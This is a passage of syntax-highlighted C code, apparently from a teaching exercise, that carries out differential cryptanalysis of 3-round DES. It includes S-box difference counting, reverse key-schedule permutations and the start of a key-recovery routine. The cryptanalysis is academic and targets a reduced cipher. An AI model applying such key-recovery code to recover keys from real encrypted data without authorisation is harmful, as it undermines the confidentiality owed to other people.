class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s%s "</span><span class="token punctuation">,</span> bin<span class="token punctuation">[</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> bin<span class="token punctuation">[</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>mode <span class="token operator">==</span> HEX_M<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">/* print array in hex */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">8</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//格式化输出一个字节（8位）的十六进制值</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>mode <span class="token operator">==</span> DEC_M<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">/* print array in decimal */</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">16</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">print_des</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>in<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>out<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\tP: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">print_array</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\tC: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">print_array</span><span class="token punctuation">(</span>out<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* End of helper functions */</span><span class="token comment">/* Test the J matrix, here we calculate the value with whole 8 S boxes, * not one by one. */</span><span class="token keyword">void</span> <span class="token function">test_j</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sindiff<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> soutdiff<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token keyword">unsigned</span> <span class="token keyword">char</span> sin<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> in<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> out<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> outdiff<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> result<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> inS<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* get single S box's input from 48bits array to 8 char. */</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token comment">/* inS[0] store input to S1, etc. */</span>     inS<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sin<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>    inS<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sin<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>sin<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>    inS<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sin<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>sin<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>    inS<span class="token punctuation">[</span><span class="token number">4</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> sin<span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">64</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token comment">/* test input from 0 to 63 to every S box */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>           <span class="token comment">/* clean input array(48bits) to store */</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment">/* first part of a difference pair */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment">/* store i(6 bits) to items in input array */</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfc</span><span class="token punctuation">;</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x03</span><span class="token punctuation">;</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">;</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">;</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xc0</span><span class="token punctuation">;</span>      in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">|=</span> i <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>           <span class="token comment">/* XORed 1st part to get 2nd part in pair */</span>      in<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> sindiff<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">contract</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> out<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* get 1st part's S box output */</span>    <span class="token function">contract</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> out<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">/* get 2nd part's S box output */</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment">/* calculate S box's output diff of pair */</span>      outdiff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> out<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> out<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* XORed with the known outputdiff */</span>      result<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> outdiff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^</span> soutdiff<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">/* if Sx's outdiff equals soutdiff, the 4 bits in result array should        * be 0, so Jx array correspoding counter++. */</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0x0f</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> J<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">^</span>inS<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0x0f</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> J<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token operator">^</span>inS<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/* get the 64 bits key from 48-bits subkey. */</span><span class="token keyword">void</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sub_key<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>             <span class="token keyword">unsigned</span> <span class="token keyword">char</span> unknown<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> round<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>p <span class="token operator">=</span> unknown<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>r_sub_key<span class="token punctuation">;</span>  <span class="token comment">/* convert the subkey to a 48 item array */</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">48</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        pc1m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>sub_key<span class="token punctuation">[</span>j<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> bytebit<span class="token punctuation">[</span>j<span class="token operator">&amp;</span><span class="token number">0x7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">/* clear key to store 56 bits halves */</span>  j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token comment">/* do reverse PC-2 permutation */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rpc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">/* PC-2 permute a 48 bits array to 56 bits */</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>pc1m<span class="token punctuation">[</span>rpc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">/* so there will be 8 bits undetermined */</span>        key<span class="token punctuation">[</span>i<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>i<span class="token operator">&amp;</span><span class="token number">0x7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      unknown<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment">/* store the unkown bit's location */</span>    <span class="token punctuation">}</span>  <span class="token comment">/* convert the 56 bits halves to a 56 bits array */</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>    pc1m<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>j<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> bytebit<span class="token punctuation">[</span>j<span class="token operator">&amp;</span><span class="token number">0x7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* rotate the array with right amount  */</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">56</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>     pcr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> pc1m<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">=</span>j<span class="token operator">-</span>totrot<span class="token punctuation">[</span>round<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span>j<span class="token operator">&lt;</span><span class="token number">28</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">?</span> i <span class="token operator">:</span> <span class="token number">28</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token comment">/* clear key again to store 64 bits key */</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">64</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token comment">/* do reverse PC-1 permutation */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rpc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>pcr<span class="token punctuation">[</span>rpc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        key<span class="token punctuation">[</span>i<span class="token operator">&gt;&gt;</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> bytebit<span class="token punctuation">[</span>i<span class="token operator">&amp;</span><span class="token number">0x7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* get the unknown bits change while permute from 56 bits to 64 bits */</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">/* rotate */</span>    unknown<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">=</span>unknown<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>totrot<span class="token punctuation">[</span>round<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>unknown<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span><span class="token number">28</span> <span class="token operator">?</span> <span class="token number">28</span> <span class="token operator">:</span> <span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                  <span class="token operator">?</span> j <span class="token operator">:</span> j<span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">;</span>    unknown<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> pc1<span class="token punctuation">[</span>unknown<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">crack_3round</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">text_pair</span> plain<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                  <span class="token keyword">struct</span> <span class="token class-name">text_pair</span> cipher<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">register</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>  <span class="token comment">/* Store cracked 3 round subkey, the key, the unkown bits. */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> sub_key3<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> unknown_bit<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* The input and output diff of chosen pairs. */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> inDiff<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> outDiff<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> T<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* Round 3 S box input, output and diffs. */</span>  <span class="token keyword">struct</span> <span class="token class-name">sin_pair</span> S3in<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">sout_pair</span> S3out<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> S3inDiff<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> S3outDiff<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* ---------------- DC start. ------------------*/</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nDifferencial Cryptanalysis start...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">/* Got 3rd round S box input. */</span>    <span class="token function">expand</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">,</span> S3in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span 